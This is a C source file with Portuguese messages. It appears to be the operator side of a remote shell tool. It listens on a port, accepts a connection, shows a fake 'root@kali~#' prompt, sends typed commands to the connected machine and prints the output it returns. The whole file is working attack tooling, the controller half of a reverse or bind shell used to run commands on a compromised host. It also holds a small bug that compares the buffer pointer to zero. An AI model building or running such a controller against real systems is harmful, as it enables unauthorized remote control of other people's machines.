#include "server.h"

int main(){
    // WSADATA wsa_data;
    // int iResult = WSAStartup(MAKEWORD(2,2), &wsa_data);

    int meusocket,x,client_conn;
    char buffer[BUFFER_SIZE];
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    int caddr_len = sizeof client_addr;
    
    bzero(&server_addr, sizeof(server_addr)); 
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    
    meusocket = socket(AF_INET,SOCK_STREAM,0);
    if(meusocket != -1){
        printf("[+]Socket iniciado!\n");
    } else {
        perror("[-]socket() failed\n");
    }
    if(bind(meusocket,(struct sockaddr *)&server_addr, sizeof server_addr) == -1){
        perror("[-]Erro ao executar bind()\n");
        printf("\n");
        return 0;
    }
    if(listen(meusocket, 1) != 0){
        perror("[-]Erro ao executar listen()\n");
        printf("\n");
        return 0;
    } else {
        printf("[+]Servidor escutando na porta - %d\n",PORT);
    }
    client_conn = accept(meusocket,(struct sockaddr *)&client_addr, &caddr_len);
    if(client_conn < 0){
        perror("[-]Erro ao aceitar a conexão\n");
        printf("\n");
        return 0;
    } else {
        printf("[+]Conexão aceita!\n");
    }

    while(1){
        memset(&buffer, 0x0, BUFFER_SIZE);
        printf("\nroot@kali~# ");
        // scanf("%[^\n]s",buffer);
        fgets(buffer, BUFFER_SIZE, stdin);
        if(!strcmp(buffer,"exit\n")){
            exit(0);
        }
        if(buffer > 0){
            send(client_conn, buffer, (int)strlen(buffer), 0);
            printf("[+]Comando enviado!\n");
        } else {
            printf("[-]Nenhum caracter digitado\n");
            continue;
        }

        memset(&buffer, 0x0, BUFFER_SIZE);
        if(recv(client_conn, buffer, BUFFER_SIZE, 0) > 0){
            if(!strcmp(buffer,"error")){
                printf("[-]Falha ao executar o comando\n");
            }
            printf("[+]Comando recebido:\n\n%s",buffer);
            continue;
        }
    }
}
